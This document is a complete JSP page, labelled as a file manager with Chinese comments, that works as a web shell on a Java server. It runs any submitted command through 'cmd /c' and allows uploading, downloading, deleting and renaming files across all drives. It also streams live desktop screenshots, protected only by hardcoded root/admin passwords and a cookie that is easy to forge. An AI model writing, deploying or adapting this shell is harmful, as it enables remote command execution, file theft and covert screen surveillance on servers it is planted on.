<%@page import="java.util.zip.GZIPOutputStream"%>
<%@page import="java.awt.Toolkit"%>
<%@page import="java.awt.Dimension"%>
<%@page import="java.awt.Rectangle"%>
<%@page import="java.awt.Robot"%>
<%@page import="java.util.Set"%>
<%@page import="java.util.Date"%>
<%@page import="java.util.List"%>
<%@page import="java.util.Base64"%>
<%@page import="java.util.Arrays"%>
<%@page import="java.util.HashMap"%>
<%@page import="java.util.Map.Entry"%>
<%@page import="java.util.StringTokenizer"%>
<%@page import="java.io.File"%>
<%@page import="java.net.URI"%>
<%@page import="java.net.URL"%>
<%@page import="java.awt.Color"%>
<%@page import="java.awt.Graphics"%>
<%@page import="java.net.URLDecoder"%>
<%@page import="java.net.URLEncoder"%>
<%@page import="java.nio.file.Files"%>
<%@page import="java.nio.file.Paths"%>
<%@page import="java.io.IOException"%>
<%@page import="java.io.PrintWriter"%>
<%@page import="java.io.InputStream"%>
<%@page import="java.io.StringReader"%>
<%@page import="java.io.OutputStream"%>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.DataInputStream"%>
<%@page import="java.io.FileInputStream"%>
<%@page import="java.io.DataOutputStream"%>
<%@page import="java.io.FileOutputStream"%>
<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedInputStream"%>
<%@page import="java.io.ByteArrayOutputStream"%>
<%@page import="javax.swing.Icon"%>
<%@page import="javax.imageio.ImageIO"%>
<%@page import="javax.swing.ImageIcon"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.awt.image.BufferedImage"%>
<%@page import="javax.swing.filechooser.FileSystemView"%>
<%@page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>   
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title> </title>
<style type="text/css">
	 *{position:relative;}
	 a:visited{color:black}
	 a:active{color:yellow}
	 a:link:hover{color:red}
	 a:link{
	 	 color:black; 
	 	 text-decoration:none
 	 }
 	 body{
		 color:black;
		 font:18px red 微软雅黑;
		 background-color:#FDF5E6; /* 香槟金 */
		 background-repeat:space;
		 background-size:100% 1920px;
		 background-attachment:scroll;
 	 }
 	 table{
	     width:80%;
		 margin-top:0;
		 cellspacing:0;
		 cellpadding:0;
		 margin-left:10%;
		 margin-right:10%;
		 border-spacing:0;
		 border:1px #ffd9b3 solid;
 	 }
	 td{
	 	height:21px;
	 	color:black;
	 	text-align:left;
	 	padding-left:20px;	
 	}
 	.screen,.helpDiv,.CommandDiv{
	 	width:80%;
	 	margin-top:0;
	 	display:none;
	 	margin-left:10%;
	 	margin-right:10%;
 	}
 	input,textarea,tr,td{
 	 	background-color: #FDF5E6;
 	 	border:1px #ffd9b3 solid;
 	}
  	textarea[rows='30']{
	 	top:26px;left: 10% ;
	 	width:79.5%;
 	}
 	.screen>img,textarea[rows='33']{
 		width: 99.6%
 	}
 	.login{
	  	margin-left: 38%;
	  	margin-top: 10%;
  	}
 	.login>input[type='submit']{
	 	left: 13%;
	 	top:20px
	}
	h3{
		margin-left:39%;
		top: 50px;
	}
	tr:hover{
		background-color: #ffbf80
		}
 	.filelist{
 		top:-2px
 	}
 	.img{
 		top:26px;
 		left:10%;
 	}
 	img{
 	 margin-top: -5px;	
 	}
 	
</style>
<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
<script type="text/javascript">    
	function rename(ele) {
		var namecol=ele.parentElement.previousElementSibling.previousElementSibling.previousElementSibling
		var showoldname=namecol.innerHTML.split(">")[1].split("<")[0]
		var inhtml= '<form method="post"><input type="hidden" name="oldName" value="'+showoldname+'"><input size="30" type="text" name="newName" value='+showoldname+'><input type="submit" value="保存"></form>'
		namecol.innerHTML=inhtml;
	}
	
	var show=false;
	var timer;
	window.onload=function(){
		 $("tr:even").css('background-color',' #fff2e5');	 
		 $("tr:odd").css('background-color','#FDF5E6');
		 switchDiv();
		 switchDiv();
		 var index=0;
		 var msgDiv=$(".root").children("table").find("[colspan='10']").get(0);
		 var to = $(".root").children("table").find("a");
		 function keyDown(e) {
			var keyCode = e.which||e.keyCode;
		    if(keyCode==13){
		    	 $("div").children("input")[1].click();
		    } else if(e.shiftKey && keyCode == 88)  {
		    	 switchDiv(keyCode);
			} else if(keyCode==102||e.shiftKey && keyCode == 65)  {
		         index++;
		         if(index==3||keyCode==65){ 
		        	 index=0;
		        	 switchDiv();
		         }
			} else if(e.shiftKey && keyCode == 67 && to.get(4)!=undefined){//C
			 	 location.replace(to.get(0));
			  	 msgDiv.innerHTML="跳转到C:";
			} else if(e.shiftKey && keyCode == 68 && to.get(4)!=undefined){//D
			  	 location.replace(to.get(1));
			 	 msgDiv.innerHTML="跳转到D:";
			} else if(e.shiftKey && keyCode == 69 && to.get(4)!=undefined){//E
			  	 location.replace(to.get(2));
			 	 msgDiv.innerHTML="跳转到E:";
			} else if(e.shiftKey && keyCode == 70 && to.get(4)!=undefined){//F
			 	 location.replace(to.get(3));
			 	 msgDiv.innerHTML="跳转到F:";
			} else if(e.shiftKey && keyCode == 71 && to.get(4)!=undefined){//G
				 location.replace(to.get(4));
				 msgDiv.innerHTML="跳转到G:";
			} else if(e.shiftKey && keyCode == 72 && to.get(5)!=undefined){//H
				 location.replace(to.get(5));
				 msgDiv.innerHTML="跳转到H:";
			} else if(e.shiftKey && keyCode == 73 && to.get(6)!=undefined){//I
				 location.replace(to.get(6));
				 msgDiv.innerHTML="跳转到I:";
			} else if(e.shiftKey && keyCode == 74 && to.get(7)!=undefined){//J
				 alert(to.get(7));
				 location.replace(to.get(7));
				 msgDiv.innerHTML="跳转到J:";
			} else if(e.shiftKey && keyCode == 83){ 
				show=show==false?true:false
				timer=show?window.setInterval(getScreen,200):null;
				
			} 
		} 
		document.onkeydown = keyDown;
	} 
	var img=document.getElementsByName('imgScreen'); 
	function getScreen(){ 
		 if(show){
			console.log('screen');
			$(".screen").css("display","block");
			$(".fileListTable").css("display","none");
			console.log(img.length);
			for(var i=0;i<img.length;i++) { 
			    img[i].src='JspTest.jsp?action=screen&screenIndex='+i+'&time='+Math.random(); 
			    sleep(50);
			} 
		}else{
			$(".fileListTable").css("display","block");
			$(".screen").css("display","none");
		}
	}

	function sleep(numberMillis) {
		   var now = new Date();
		   var exitTime = now.getTime() + numberMillis;
		   while (true) {
		      now = new Date();
		      if (now.getTime() > exitTime)
		      return;
		      }
	 }
	function switchDiv(KeyCode) {
		var inx=$(".CommandDiv").children("input").get(0);
		var fileList=$(".fileListTable");
		var Command=$(".CommandDiv");
		var help=$(".helpDiv");
		var showdoc=$("textarea[rows='30']");
		if (KeyCode==88) {
			if(	help.css("display") == "none"){
				help.css("display","block");
				Command.css('display','none');
				fileList.css('display','none'); 
			}else{
				help.css("display","none");
				fileList.css('display','block');
			}
		} else {
			if(fileList.css('display') == "block"){
				help.css("display","none");
				Command.css('display','block');
				fileList.css('display','none');
				showdoc.css('display','none');
				inx.value="";
			 	inx.focus();
			}else{
				help.css("display","none");
				Command.css('display','none');
				showdoc.css('display','block');
				fileList.css('display','block');
			}    
		}
	}
	function sendCommand(inx){
		$.post("",inx.name+"="+inx.value,function(date){
			var cmdOut=date.split('StrSplit')[2];
			 $(inx).next().next().html(cmdOut); 
			 if(eval(cmdOut.substring(0,7)=='Refresh')){
				 location.reload();
			 }
		},"html");
		inx.value="";
		inx.focus();
	}

	
</script>
</head>
<body>
<%
	request.setCharacterEncoding ("utf-8");
	response.setCharacterEncoding ("utf-8");
	response.setContentType("text/html;charset=utf-8");
	req=request;
	res=response;  
	url=request.getRequestURI().split("/")[2];
	action=request.getParameter("action");
	oldname=request.getParameter("oldName");
	newname=request.getParameter("newName");
	dir=request.getParameter("dir");
	msg=dir=dir==null?(String)application.getAttribute("dir"):decode(dir);
	if(dir!=null){application.setAttribute("dir", decode(dir));}else{dir="C:\\";}
	action=action==null?"list":action;
	HashMap<String, String> user = new HashMap<>();
	String cmdStr=request.getParameter("commandStr");
	//设置账号密码
	user.put("root", "root");
	user.put("admin", "admin");
	String username = req.getParameter("username");
	String password = req.getParameter("password");
	if(newname!=null){
	 	msg=rename(newname,oldname);   
	}else if(request.getContentLengthLong()>180){
		load(request,response);
	}if(cmdStr!=null){ 
		if(cmdStr.startsWith("cd")){
			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
			System.out.println("切换目录"+dir);
			application.setAttribute("dir", dir);
			out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
		}
		out.println("StrSplit"+command(cmdStr,(String)application.getAttribute("dir"))+"StrSplit");
	}
	Cookie[] cookie = req.getCookies();
	boolean red = false;
	try{
		if(cookie!=null){
			for (Cookie co : cookie) {
				red = co.getName().equals("root");
				if (red) {// 如果找到指定Cookie
			     break;
				}
			}
		}
	}catch(Exception e){
	    
	}
 if (cookie==null||red == false) {// 如果找不到指定Cookie
	 String formStr="<form class='login' method='post'>账号：<input type='text' name='username'><br/>密码：<input type='text' name='password'><br/><input type='submit' value='登录'></form>";
	 request.setAttribute("form", formStr);
		 try {
			 //System.out.println("账号：" + username + "\t密码" + password);
			    Set<Entry<String, String>> xx= user.entrySet();
			    for(Entry<String, String> use:xx){
			    	if(use.getKey().equals(username)&&use.getValue().equals(password)) {
						Cookie cookie0 = new Cookie("root", username);
						cookie0.setMaxAge(sessionAge);//会话存活时间(秒)
						res.addCookie(cookie0);
						res.sendRedirect(url);
					}
			    }   // 密码错误
					%><h3>密码错误</h3>${form}<% 
			} catch (Exception e) {
				// 如果表单数据为空 空指针异常
					%><h3>请验证密码</h3>${form}<% 
			}
 }else if(red){// 如果找到指定Cookie
 		%> <%!
	static String url="";
	static String msg="";
	static String tag="";
	static String dir="";
	static String action="";
	static String newname="";
	static String oldname="";
	static String spacelength="";
	static int sessionAge=1800;
	static boolean Refresh=false;
	static HttpServletRequest req=null;
	static HttpServletResponse res=null;
	static File[] FileRoot = File.listRoots();
	static Base64.Decoder decoder = Base64.getDecoder();
	static Base64.Encoder encoder = Base64.getEncoder();
	private static Rectangle rect[] = new Rectangle[6];
	static{
	  Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
	  int width = d.width;
	  int height = d.height;
	  for (int i = 0; i < rect.length; i++){
	   rect[i] = new Rectangle(0, height / 6 * i, width, height / 6);
	  }
	}
	 
	static String ListPath( String ac,File file){
	    //long size=getFileSize(F);
	    req.setAttribute("Loginmsg", "");
	    String CreateTime = "<td> "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()))+"</td>";  
		String renameStr="<td><input type='button' onclick='rename(this)' value='重命名 '></td>";
		String fhiddeStr="<td style='color:red'>"+(file.isHidden()?"√":"×")+"</td>";
		String fReadsStr="<td style='color:red'>"+(file.canRead()?"√":"×")+"</td>";
		String requrlStr="<a href='"+ url+"?dir="+ encode(file.getAbsolutePath())+"&action=";
		String fiSizeStr="<td>"+(file.length()/1024>1024?file.length()/1024/1024+"MB":file.length()/1024+"KB")+"</td>";
		//String dirSizeStr="<td>"+(size/1024>1024?size/1024/1024+"MB":size/1024+"KB")+"</td>";
		if(ac.equals("isRoot")){
		    tag= "<td><a href='"+ url+"?dir="+ encode(file.getPath())+"&action=list'>"+file.getPath().substring(0, 2)+"</a></td>";
		}else if(ac.equals("isDir")){
		    tag= "<tr><td><img src='"+imgencode64(file)+"'/> <a href='"+ url+"?dir="+encode(file.getPath())+"&action=list'>"+file.getName()+"</a></td>"
			     +"<td></td>"+"<td>"+requrlStr+"del'>删除  </a></td>"+renameStr+"<td></td>"+fhiddeStr+fReadsStr+CreateTime+"</tr>";
		}else if(ac.equals("isFileDownLink")){
		    tag= "<td>"+requrlStr+"down'>下载  </a></td><td>"+requrlStr+"del'>删除  </a></td>"
				 +renameStr+fiSizeStr+fhiddeStr+fReadsStr+CreateTime+"</tr>";
		}else {
		    tag="<tr><td><img src='"+imgencode64(file)+"'/>"+requrlStr+"preview'>"+file.getName()+"</a></td>";
		}
		return tag;
	}
	
	static String imgencode64(File file){//文件icon图标的Base64编码
	 ImageIcon icon=(ImageIcon) FileSystemView.getFileSystemView().getSystemIcon(file);
	 BufferedImage bu = new BufferedImage(icon.getIconWidth(),icon.getIconHeight(), BufferedImage.TYPE_INT_RGB);
	     Graphics g=bu.getGraphics();
	     g.setColor(Color.WHITE);
		 g.fillRect(0,0,50,50);//填充整个画布为白色  
		 g.drawImage(icon.getImage(), 0, 0, icon.getIconWidth(), icon.getIconHeight(),null);
	     ByteArrayOutputStream imageStream = new ByteArrayOutputStream();
	     try{
	     ImageIO.write(bu, "png", imageStream);
	     }catch(Exception e){
	     } 
	  byte[] tagInfo = imageStream.toByteArray();
	  return "data:image/png;base64,"+encoder.encodeToString(tagInfo); 
	 }
	 
	static String encode(String x){//url编码
		try{
		    x=URLEncoder.encode(x, "utf-8");
		}catch(Exception e){
		}
		return x;
	}
	static String decode(String x){//url解码
		try{
		    x=URLDecoder.decode(x,"utf-8");
		}catch(Exception e){}
		return x;
	}
	static void load(HttpServletRequest request, HttpServletResponse response)
				throws ServletException,IOException {//文件上传
		 	String filename="";
			int totalBytes = request.getContentLength();
			System.out.println("当前数据总长度:" + totalBytes);
			String contentType = request.getContentType();
			int position = contentType.indexOf("boundary=");
			String startBoundary = "--" + contentType.substring(position + "boundary=".length());
			String endBoundary = startBoundary + "--";
			InputStream inputStream = request.getInputStream();
			DataInputStream dataInputStream = new DataInputStream(inputStream);
			byte[] bytes = new byte[totalBytes];
			dataInputStream.readFully(bytes);
			dataInputStream.close();
			BufferedReader reader = new BufferedReader(new StringReader(new String(bytes)));
			int temPosition = 0;
			boolean flag = false;
			int end = 0;
			while (true) {
				if (flag) {// 当读取一次文件信息后
					bytes = subBytes(bytes, end, totalBytes);
					temPosition = 0;
					reader = new BufferedReader(new StringReader(new String(bytes)));
				}
				String str = reader.readLine();
				System.out.println("this line is:" + str);
				temPosition += str.getBytes().length + 2;
				if (str == null || str.equals(endBoundary)) {
					break;
				}
				if (str.startsWith(startBoundary)) {// 判断当前头对应的表单域类型是否是文件上传
					str = reader.readLine(); // 读取当前头信息的下一行:Content-Disposition行
					temPosition += str.getBytes().length + 2;
		            System.out.println(str+233);
					if (str.indexOf("filename=") == -1) {//如果是普通文本域表单
						  reader.readLine();
						  str=reader.readLine();				     
						  System.out.println("编辑文件");
						  System.out.println("普通文本域表单值"+str);
						 
					} else {//如果是文件上传表单
						StringTokenizer Fn= new StringTokenizer(str,"\\\"");
						while(Fn.hasMoreElements()){//获取文件名
							filename =  Fn.nextToken();
						}
						if(filename.equals("; filename=")){
						    msg="请选择文件";
						    break;
						}else if(dir==null){
						    msg="请跳转至可用的目录";
						    break;
						}else {
						System.out.println("保存的文件名："+filename);
						filename=new String (filename.getBytes(),"utf-8");
						temPosition += (reader.readLine().getBytes().length + 4);
						end =  locateEnd(bytes, temPosition, totalBytes, endBoundary);
						//String Savepath = request.getSession().getServletContext().getRealPath("/");
						//String SavePath = System.getProperty("user.home") + "\\    \\";
						String SavePath =dir+"\\"+filename;
						System.out.println(SavePath);
							DataOutputStream dOutputStream = new DataOutputStream(
									new FileOutputStream(new File(SavePath)));
							dOutputStream.write(bytes, temPosition, end - temPosition - 2);
							dOutputStream.close();
							msg=dir+filename+"上传成功！";
						} 
						flag = true;
					}
				}
			}
		}
		public static int locateEnd(byte[] bytes, int start, int end, String endStr) { //计算文件结束符的位置
			byte[] endByte = endStr.getBytes();
			
			for (int i = start + 1; i < end; i++) {
				if (bytes[i] == endByte[0]) {
					int k = 1;
					while (k < endByte.length) {
						if (bytes[i + k] != endByte[k]) {
							break;
						}
						k++;
					}
					if (i == 3440488) {
						System.out.println("start");
					}  
					if (k == endByte.length) {
						return i;
					}
				}  
			}
	
			return 0;
		}
		private static byte[] subBytes(byte[] b, int from, int end) {
			byte[] result = new byte[end - from];
			System.arraycopy(b, from, result, 0, end - from);
			return result;
		}
	    public static long getFileSize(File file) { // 取得文件夹所有子文件夹及文件的磁盘占用大小
			long size = 0;
			try {
			    File flist[] = file.listFiles();
			    if (flist != null && flist.length > 0) {
					for (int i = 0; i < flist.length; i++) {
					    if (flist[i] != null && flist[i].canRead() && flist[i].canWrite()) {
							if (flist[i].isDirectory()) {
							    size += getFileSize(flist[i]);
							} else if (flist[i].isFile()) {
							    size += flist[i].length();
							}
					    }
					}
			    }
			} catch (Exception e) {
	 		}
			return size;
		  }
	    public static String rename(String newname,String oldname){//文件重命名
		    System.out.println("文件重命名\n新的名称"+newname+"\n旧的文件名"+oldname);
		    if(!oldname.equals(newname)){
		        File oldfile=new File(dir+"/"+oldname); 
		        File newfile=new File(dir+"/"+newname); 
			        if(newfile.exists()||!oldfile.canRead()||! oldfile.canWrite()) {
			            msg=(newname+"已经存在！"); 
			        }else{ 
			           msg=(oldfile.renameTo(newfile)?"重命名成功！"+oldname+"  >>>  "+newname:"重命名失败！");
			        }
		    }else{
				msg=("新文件名和旧文件名相同");
		    }
		    return msg;
	    }
	    static void fileDownload(String filePath,boolean isOnLine){//下载文件
			File f = new File(filePath);
			 try{
				BufferedInputStream br = new BufferedInputStream(new FileInputStream(f));
				byte[] buf = new byte[1024];
				int len = 0;
				res.reset();// 去除空白行
				if (isOnLine) { // 在线打开方式
					URL u = new URL("file:///" + filePath);
					System.out.println(u.openConnection().getContentType());
					//res.setContentType(u.openConnection().getContentType());
					res.setContentType("video/mp4");
					res.setHeader("Content-Disposition", "inline; filename=" + f.getName());
					// 文件名应该编码成UTF-8
				} else { // 纯下载方式
					res.setContentType("application/x-msdownload");
					res.setHeader("Content-Disposition", "attachment; filename=" + f.getName());
				}
				OutputStream outStream = res.getOutputStream();
				while ((len = br.read(buf)) > 0)
					outStream.write(buf, 0, len);
				br.close();
				outStream.close();
			 }catch(Exception e){}
	    }
	    static String command(String x,String dirs){//执行控制台命令
			 String Res="";
			 try{
				 x = x == null ? "ver" : x;
				 Process p = Runtime.getRuntime().exec("cmd /c " + x,null, new File(dirs));
				 InputStream is = p.getInputStream();
				 InputStream rr = p.getErrorStream();
				 BufferedReader reader = new BufferedReader(new InputStreamReader(is, "GBK"));
				 BufferedReader readrr = new BufferedReader(new InputStreamReader(rr, "GBK"));
				 String line;
				 while ((line = reader.readLine()) != null || (line = readrr.readLine()) != null) {
				 	 Res+=line+"\r\n";
				 }
				 reader.close();
				 p.destroy();
			 }catch(Exception e){
			 }
			 return Res;
		 }
	    static String fileType(String fileName) {//判断文件类型
		String fileType = fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length()).toLowerCase();
		String img[] = { "bmp", "jpg", "jpeg", "png", "tiff", "gif", "pcx", "tga", "exif", "fpx", "svg", "psd", "cdr",
			"pcd", "dxf", "ufo", "eps", "ai", "raw", "wmf" };
		for (int i = 0; i < img.length; i++) {
		    if (img[i].equals(fileType)) {
			return "图片";
		    }
		}
		String document[] = {"lrc", "conf","java","css","js","txt", "bat", "vbs", "py", "htm", "html", "jsp", "sh", "ini", "config", "info","xml","sql"};
		for (int i = 0; i < document.length; i++) {
		    if (document[i].equals(fileType)) {
			return "文档";
		    }
		}
		String video[] = { "mp4", "avi", "mov", "wmv", "asf", "navi", "3gp", "mkv", "f4v", "rmvb", "webm" };
		for (int i = 0; i < video.length; i++) {
		    if (video[i].equals(fileType)) {
			return "视频";
		    }
		}
		String music[] = { "mp3", "wma","wmv", "wav", "mod", "ra", "cd", "md", "asf", "aac", "vqf", "ape", "mid", "ogg",
			"m4a", "vqf" };
		for (int i = 0; i < music.length; i++) {
		    if (music[i].equals(fileType)) {
			return "音乐";
		    }
		}
		return "其他";
	    }  
	 %>

 <div class="fileListTable">
 	<div class="title" align="center">
		<h1><a href="<%=url%>">文件管理</a></h1>
	</div>
	<div class="root">
		<table>
		<tr>
			<%for(File x:FileRoot)out.println(ListPath( "isRoot",x));%>
			<td>
				<form  enctype="multipart/form-data" method="post">
					<input type="submit" value="上传至当前目录 " size="50">
				    <input type="file" name="file" size="30"  >  
				</form>
			</td>
			<td>
				<input type="button" value="返回上级目录" onclick="window.history.back()">
			</td>
		</tr>
		<tr>
			<td colspan="2" style="min-width:80px;">当前目录 </td>
			<td colspan="10"><%=msg%></td>
		<tr/>
		</table>
	</div>
	<table class="filelist">
	 	<tr> 
			<td>名称</td>
			<td>下载</td>
			<td>删除</td>
			<td>重命名</td>
			<td>大小</td>
			<td>隐藏</td>
			<td>读写</td>
			<td>创建日期</td>
	 	</tr>
	<% 
	if(dir!=""){
	    if (action.equals("screen")){
		    Integer index= Integer.parseInt(request.getParameter("screenIndex"));
			ImageIO.write(new Robot().createScreenCapture(rect[index]), "PNG",response.getOutputStream());
		    return;
		} else if(action.equals("list")){
		    System.out.println("获取文件列表:\t"+dir);
		    try{
				action=decode(action);
				File[] file=new File(dir).listFiles() ;
				 for(File x:file){
					 out.println(x.isFile()?ListPath( "isFile",x)+ListPath( "isFileDownLink",x):ListPath( "isDir",x));
				 }
			}catch(Exception e1){
			  //  out.println("拒绝访问");
			}
		}else if(action.equals("down") ){//文件下载 
			fileDownload(dir,false);
		    System.out.println("下载文件"+dir);
		}else if(action.equals("del")){//删除文件
		    System.out.println("删除文件"+dir);
		    File f=new File(dir);
		    if(f.isFile()){
				if(f.canWrite()&&f.canRead()){
				    if(f.delete()){ 
						out.println(dir+"删除成功！");
				    }else{
					 out.println(dir+"没有读写权限");
				    }
				}else{
				    out.println(dir+"没有读写权限");
				}	
		    }else{
		    	String re=command("rd "+dir+" /S /Q",dir);
		    	System.out.println("调用系统命令删除"+re);
		    }
		    req.getRequestDispatcher(url+"?dir="+ encode(f.getParent())+"&action=list").forward(req, res);
		} else if(action.equals("preview") ){ 
		    System.out.println("预览文件");
		    String type=fileType(dir );
		    System.out.println(type);
		     if(type.equals("文档")){//在线浏览文档
		    	 out.println("</table></div><textarea rows=30>"+ new String(Files.readAllBytes(Paths.get(dir)) ,"utf-8")  +"</textarea>");
			}else if(type.equals("图片")){//在线浏览图片
			     String imgurl="data:image/png;base64,"+encoder.encodeToString(Files.readAllBytes(Paths.get(dir))); 
			     out.println("</table></div><img class='img' src='"+imgurl+"'/>"); 
			}else if(type.equals("视频")){//在线浏览视频
				System.out.println("播放视频："+dir);
				fileDownload(dir,true);
			} 
		} 
	}
}
	%>
 </table>  
</div> 
	<div class="CommandDiv"><input type="text" name="commandStr" size=25><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
</div>
<div class="helpDiv" > 
</div>
<div class="screen">
<img name=imgScreen />
<img name=imgScreen /> 
<img name=imgScreen />
<img name=imgScreen /> 
<img name=imgScreen />
<img name=imgScreen /> 
</div>					  
</body>
</html>